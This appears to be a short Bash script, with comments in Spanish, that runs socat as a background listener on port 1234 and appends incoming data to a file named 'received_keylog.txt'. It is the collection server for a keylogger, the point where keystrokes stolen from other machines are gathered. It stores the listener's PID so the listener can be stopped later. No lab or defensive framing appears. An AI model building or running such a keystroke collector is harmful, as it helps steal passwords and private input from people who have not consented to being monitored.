#!/bin/bash

PORT=1234
LOG_FILE="received_keylog.txt"

echo "[*] Iniciando socat en el puerto $PORT y guardando logs en $LOG_FILE..."

# Iniciar socat en segundo plano y redirigir logs
socat -u TCP-LISTEN:$PORT,reuseaddr OPEN:$LOG_FILE,creat,append &

# Guardar el PID para detenerlo después
echo $! > /tmp/socat_pid

echo "[*] Socat está corriendo en segundo plano."
